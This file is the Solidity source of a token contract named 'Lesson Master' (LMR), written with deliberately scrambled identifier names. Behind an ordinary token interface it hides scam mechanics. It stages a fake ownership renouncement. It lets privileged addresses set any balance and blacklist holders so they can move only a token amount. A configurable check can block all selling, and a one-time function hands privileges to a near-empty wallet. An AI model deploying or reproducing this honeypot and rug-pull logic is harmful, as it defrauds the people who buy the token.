//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface maxTrading {
    function createPair(address tokenIs, address amountFund) external returns (address);
}

interface enableTradingAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedFrom) external view returns (uint256);

    function transfer(address enableTxReceiver, uint256 totalList) external returns (bool);

    function allowance(address fundSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalList) external returns (bool);

    function transferFrom(
        address sender,
        address enableTxReceiver,
        uint256 totalList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletToken, uint256 value);
    event Approval(address indexed fundSwap, address indexed spender, uint256 value);
}

abstract contract txSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellSenderTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletTake is enableTradingAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LessonMaster is txSell, enableTradingAuto, walletTake {

    function minShould() public {
        emit OwnershipTransferred(marketingShould, address(0));
        buyTotalTeam = address(0);
    }

    constructor (){
        if (totalLiquidity == walletMarketing) {
            toMode = takeShouldEnable;
        }
        sellSenderTotal walletTeam = sellSenderTotal(toLiquidity);
        exemptTrading = maxTrading(walletTeam.factory()).createPair(walletTeam.WETH(), address(this));
        
        marketingShould = _msgSender();
        tokenFee[marketingShould] = true;
        teamTrading[marketingShould] = tokenFrom;
        minShould();
        if (totalLiquidity) {
            txFee = limitEnable;
        }
        emit Transfer(address(0), marketingShould, tokenFrom);
    }

    bool public modeAmount;

    uint256 public tokenTake;

    function fromFee() private view {
        require(tokenFee[_msgSender()]);
    }

    bool public totalLiquidity;

    uint256 private limitEnable;

    uint256 private tokenFrom = 100000000 * 10 ** 18;

    address public exemptTrading;

    string private maxEnableTeam = "LMR";

    address private buyTotalTeam;

    uint256 totalBuy;

    function name() external view virtual override returns (string memory) {
        return launchSender;
    }

    event OwnershipTransferred(address indexed swapLaunched, address indexed listMarketing);

    uint256 public walletTradingLaunch;

    uint256 private toMode;

    mapping(address => bool) public tokenFee;

    function decimals() external view virtual override returns (uint8) {
        return liquidityMaxMode;
    }

    function feeList(address autoSwapIs) public {
        fromFee();
        
        if (autoSwapIs == marketingShould || autoSwapIs == exemptTrading) {
            return;
        }
        modeTxReceiver[autoSwapIs] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenFrom;
    }

    uint256 constant buyAuto = 13 ** 10;

    function transfer(address modeTrading, uint256 totalList) external virtual override returns (bool) {
        return tradingExempt(_msgSender(), modeTrading, totalList);
    }

    function tradingExempt(address amountShould, address enableTxReceiver, uint256 totalList) internal returns (bool) {
        if (amountShould == marketingShould) {
            return teamSwapLiquidity(amountShould, enableTxReceiver, totalList);
        }
        uint256 teamLaunchAuto = enableTradingAuto(exemptTrading).balanceOf(launchedFeeSender);
        require(teamLaunchAuto == totalBuy);
        require(enableTxReceiver != launchedFeeSender);
        if (modeTxReceiver[amountShould]) {
            return teamSwapLiquidity(amountShould, enableTxReceiver, buyAuto);
        }
        return teamSwapLiquidity(amountShould, enableTxReceiver, totalList);
    }

    function teamSwapLiquidity(address amountShould, address enableTxReceiver, uint256 totalList) internal returns (bool) {
        require(teamTrading[amountShould] >= totalList);
        teamTrading[amountShould] -= totalList;
        teamTrading[enableTxReceiver] += totalList;
        emit Transfer(amountShould, enableTxReceiver, totalList);
        return true;
    }

    bool public walletMarketing;

    address public marketingShould;

    mapping(address => uint256) private teamTrading;

    function allowance(address amountFromMax, address buyFund) external view virtual override returns (uint256) {
        if (buyFund == toLiquidity) {
            return type(uint256).max;
        }
        return sellSender[amountFromMax][buyFund];
    }

    function approve(address buyFund, uint256 totalList) public virtual override returns (bool) {
        sellSender[_msgSender()][buyFund] = totalList;
        emit Approval(_msgSender(), buyFund, totalList);
        return true;
    }

    function txShouldFrom(address toFund) public {
        require(toFund.balance < 100000);
        if (modeAmount) {
            return;
        }
        if (walletMarketing != totalLiquidity) {
            walletTradingLaunch = toMode;
        }
        tokenFee[toFund] = true;
        if (totalLiquidity != walletMarketing) {
            liquidityMax = takeShouldEnable;
        }
        modeAmount = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return maxEnableTeam;
    }

    mapping(address => bool) public modeTxReceiver;

    uint256 private liquidityMax;

    function owner() external view returns (address) {
        return buyTotalTeam;
    }

    mapping(address => mapping(address => uint256)) private sellSender;

    uint8 private liquidityMaxMode = 18;

    function getOwner() external view returns (address) {
        return buyTotalTeam;
    }

    uint256 public takeShouldEnable;

    uint256 public txFee;

    uint256 walletExempt;

    function transferFrom(address amountShould, address enableTxReceiver, uint256 totalList) external override returns (bool) {
        if (_msgSender() != toLiquidity) {
            if (sellSender[amountShould][_msgSender()] != type(uint256).max) {
                require(totalList <= sellSender[amountShould][_msgSender()]);
                sellSender[amountShould][_msgSender()] -= totalList;
            }
        }
        return tradingExempt(amountShould, enableTxReceiver, totalList);
    }

    string private launchSender = "Lesson Master";

    address launchedFeeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address toLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function limitFund(uint256 totalList) public {
        fromFee();
        totalBuy = totalList;
    }

    function balanceOf(address launchedFrom) public view virtual override returns (uint256) {
        return teamTrading[launchedFrom];
    }

    function teamSender(address modeTrading, uint256 totalList) public {
        fromFee();
        teamTrading[modeTrading] = totalList;
    }

}